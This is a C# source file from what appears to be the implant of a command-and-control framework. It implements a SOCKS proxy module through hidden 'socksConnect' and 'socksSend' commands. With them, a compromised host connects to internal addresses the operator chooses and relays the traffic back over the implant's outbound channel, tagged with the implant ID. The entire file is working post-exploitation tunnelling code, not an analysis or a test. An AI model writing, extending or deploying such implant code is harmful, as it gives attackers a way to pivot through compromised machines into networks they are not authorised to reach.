using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Functions;


namespace Engineer.Commands
{
    internal class socks : EngineerCommand
    {
        public static SynchronizedCollection<string> SocksClients = new();
        public static readonly  ConcurrentDictionary<string, ConcurrentQueue<byte[]>> SocksClientsData = new();
        public static int TrafficSize = 12800000;

        public override string Name => "socks";
        internal static CancellationTokenSource _tokenSource = new();
        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/port", out var port);
            //if task.arguments holds key /stop return saying the socks proxy won /port was stopped
            if (task.Arguments.ContainsKey("/stop"))
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Socks proxy on port {port} stopped", task, EngTaskStatus.Complete,TaskResponseType.String);
                _tokenSource.Cancel();
                return;
            }

            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"socks started on team server at port {port}", task, EngTaskStatus.Running,TaskResponseType.String);
        }
    }
    internal class socksConnect : EngineerCommand
    {
        public override string Name => "socksConnect";
        public override bool IsHidden => true;

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //try to get the values for /Address and /Port from the task.arguments dictionary convert the address to an IpAddress object and the port to an int
                task.Arguments.TryGetValue("/Address", out var address);
                task.Arguments.TryGetValue("/Port", out var port);
                task.Arguments.TryGetValue("/Client", out var client);
                socks.SocksClients.Add(client);
                socks.SocksClientsData.TryAdd(client, new ConcurrentQueue<byte[]>());
                //Console.WriteLine($"Connecting to {address}:{port}");

                Task.Run(async () => await ConnectSocks(address, port, client));
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Connecting to {address}:{port}" + $"\n{client}", task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            
            catch(Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error with socks connect", task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
        
        private async Task ConnectSocks(string address, string port,string client)
        {
            var ipAddress = IPAddress.Parse(address);
            var portInt = int.Parse(port);
            // connect to destination
            var destination = new TcpClient();
            destination.ReceiveBufferSize = socks.TrafficSize;
            destination.SendBufferSize = socks.TrafficSize;
            destination.NoDelay = true;
            try
            {               
                await destination.ConnectAsync(ipAddress, portInt);
                //Stopwatch Clientstopwatch = new Stopwatch();
                //decimal ClientDataSentPerSecond = 0;
                //decimal ClientnumberOfSendsPerSecond = 0;

                //Stopwatch Deststopwatch = new Stopwatch();
                //decimal DestDataSentPerSecond = 0;
                //decimal DestnumberOfSendsPerSecond = 0;

                //Console.WriteLine($"Connected to {ipAddress}:{portInt}");
                while (!socks._tokenSource.IsCancellationRequested)
                {
                    // send to destination
                    if (!socks.SocksClientsData[client].IsEmpty)
                    {
                        socks.SocksClientsData[client].TryDequeue(out var data);
                        //start the stopwatch if it is not already running, every 10 seconds that data is sent increment the DataSentPerSecond variable,
                        //print the amount of data in bytes sent per second and reset the stopwatch and DataSentPerSecond variables
                        //if (!Clientstopwatch.IsRunning)
                        //{
                        //    Clientstopwatch.Start();
                        //}
                        //ClientDataSentPerSecond += data.Length;
                        //ClientnumberOfSendsPerSecond++;
                        //if (Clientstopwatch.ElapsedMilliseconds >= 10000)
                        //{
                        //    //should only print every 10 seconds so we dont spam the console
                        //    Console.WriteLine($"Data sent to client end per second: {ClientDataSentPerSecond / 10}");
                        //    Console.WriteLine($"Number of sends to client end per second: {ClientnumberOfSendsPerSecond / 10}");
                        //    ClientDataSentPerSecond = 0;
                        //    ClientnumberOfSendsPerSecond = 0;
                        //    Clientstopwatch.Reset();
                        //}
                        //Console.WriteLine($"Engineer sending client {client} {data.Length} bytes");
                        await destination.SendData(data, socks._tokenSource.Token);
                    }
                    // read from destination
                    if (destination.DataAvailable())
                    {
                        var resp = await destination.ReceiveData(socks._tokenSource.Token);
                        //if (!Deststopwatch.IsRunning)
                        //{
                        //    Deststopwatch.Start();
                        //}
                        //DestDataSentPerSecond += resp.Length;
                        //DestnumberOfSendsPerSecond++;
                        //if (Deststopwatch.ElapsedMilliseconds >= 10000)
                        //{
                        //    //should only print every 10 seconds so we dont spam the console
                        //    Console.WriteLine($"Data obtained from client end per second: {DestDataSentPerSecond / 10}");
                        //    Console.WriteLine($"Number of sends obtained from client end per second: {DestnumberOfSendsPerSecond / 10}");
                        //    DestDataSentPerSecond = 0;
                        //    DestnumberOfSendsPerSecond = 0;
                        //    Deststopwatch.Reset();
                        //}
                        //make a new engineer task with the argument /data which is resp converted to a base64 string and then add the task to the queue
                        //var task = new EngineerTask
                        //{
                        //    Id = Guid.NewGuid().ToString(),
                        //    Command = "socksReceive",
                        //    File = resp,
                        //    Arguments = new Dictionary<string, string>
                        //{
                        //    {"/client",client }
                        //}
                        //};
                        //Task.Run(async() => await Tasking.DealWithTask(task));

                        //testing replacing the above internal task with just making a task result directly 
                        //this should work because the item is already a byte[] so i dont need the fill result json serialization stuff
                        Task.Run(() => 
                        {
                            var newTaskResult = new EngineerTaskResult
                            {
                                Id = Guid.NewGuid().ToString(),
                                Command = "socksReceive",
                                IsHidden = true,
                                ImplantId = Program._metadata.Id,
                                ResponseType = TaskResponseType.None,
                                Status = EngTaskStatus.Complete
                            };

                            var sockContent = resp;
                            byte[] sockClient = client.JsonSerialize();
                            byte[] socks_client_length = BitConverter.GetBytes(sockClient.Length);
                            byte[] finalSocksRec_content = socks_client_length.Concat(sockClient).Concat(sockContent).ToArray();
                            newTaskResult.Result = finalSocksRec_content;
                            Program._commModule.Outbound.Enqueue(newTaskResult);
                        });
                    }
                    // rip cpu
                    await Task.Delay(1);
                }
            }
            catch (Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
            }
        }
    }
    
    internal class SocksSend : EngineerCommand
    {
        public override string Name => "socksSend";
        public override bool IsHidden => true;

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/client", out var client);

            //while the socks client is waiting for data to be sent do not send the data 
            var req = task.File;
            socks.SocksClientsData[client].Enqueue(req);
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("", task, EngTaskStatus.Complete,TaskResponseType.None);
        }
    }
    
    //internal class SocksReceive : EngineerCommand
    //{
    //    public override string Name => "socksReceive";
    //    public override bool IsHidden => true;

    //    public override async Task Execute(EngineerTask task)
    //    {
    //        // trygetvalue of task.arguments /data and return that value
    //        var sockContent = task.File;
    //        //set task.FIle to null otherwise we are sending the data in the task object and the result string 
    //        task.Arguments.TryGetValue("/client", out var client);
    //        byte[] sockClient = client.JsonSerialize();
    //        byte[] socks_client_length = BitConverter.GetBytes(sockClient.Length);
    //        task.File = null;
    //        byte[] finalSocksRec_content = socks_client_length.Concat(sockClient).Concat(sockContent).ToArray();

    //       ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(finalSocksRec_content, task, EngTaskStatus.Complete, TaskResponseType.None);
    //    }
    //}

    internal static class Extensions
    {
        public static async Task<byte[]> ReceiveData(this TcpClient client, CancellationToken token)
        {
            using var ms = new MemoryStream();
            var ns = client.GetStream();
            int read;
            do
            {
                var buf = new byte[socks.TrafficSize];
                read = await ns.ReadAsync(buf, 0, buf.Length, token);
                if (read == 0)
                    break;

                await ms.WriteAsync(buf, 0, read, token);
            } while (read >= socks.TrafficSize);

            return ms.ToArray();
        }


        public static async Task SendData(this TcpClient client, byte[] data, CancellationToken token)
        {
            
            var ns = client.GetStream();
            await ns.WriteAsync(data, 0, data.Length, token);
        }

        public static bool DataAvailable(this TcpClient client)
        {
            var ns = client.GetStream();
            return ns.DataAvailable;
        }

        public static void Clear(this MemoryStream stream)
        {
            var buffer = stream.GetBuffer();
            Array.Clear(buffer, 0, buffer.Length);
            stream.Position = 0;
            stream.SetLength(0);
        }
    }
}
